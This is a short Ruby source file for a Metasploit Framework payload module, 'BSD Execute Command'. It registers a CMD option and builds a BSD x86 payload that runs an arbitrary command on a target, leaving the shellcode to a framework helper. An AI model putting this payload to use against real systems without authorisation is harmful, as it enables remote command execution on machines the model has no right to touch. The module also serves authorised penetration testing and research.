##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'msf/core/payload/bsd/x86'


###
#
# Exec
# ----
#
# Executes an arbitrary command.
#
###
module Metasploit3

  CachedSize = 16

  include Msf::Payload::Single
  include Msf::Payload::Bsd::X86

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'BSD Execute Command',
      'Description'   => 'Execute an arbitrary command',
      'Author'        => 'vlad902',
      'License'       => MSF_LICENSE,
      'Platform'      => 'bsd',
      'Arch'          => ARCH_X86))

    # Register exec options
    register_options([
      OptString.new('CMD',  [ true,  "The command string to execute" ]),
    ], self.class)
  end

  #
  # Dynamically builds the exec payload based on the user's options.
  #
  def generate_stage
    bsd_x86_exec_payload
  end

end
